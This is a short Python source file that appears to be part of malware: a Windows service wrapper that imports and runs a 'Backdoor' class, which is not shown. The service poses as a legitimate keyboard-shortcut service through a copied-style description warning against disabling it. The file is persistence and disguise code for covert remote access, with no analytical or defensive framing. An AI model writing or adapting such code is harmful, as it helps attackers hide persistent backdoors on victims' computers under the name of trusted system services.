from local_libs import service
from backdoor import Backdoor
import servicemanager
import sys


class Main(service.WinService):
    _svc_name_ = "ABC"
    _svc_display_name_ = "ABC"
    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
                        "multimedia devices. Disabling this service is not recommended."

    def __init__(self, args):
        super().__init__(args)
        self.is_running = False
        self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
        self.backdoor = None

    def log(self, log_message):
        with open(self.service_log_filepath, "a") as f:
            f.write(log_message + "\n")

    def start(self):
        self.is_running = True
        self.log("Service started")

    def main(self):
        self.backdoor = Backdoor()
        self.backdoor.run()

    def stop(self):
        self.is_running = False
        self.log("Service stopped")


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Main)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        Main.parse_command_line()

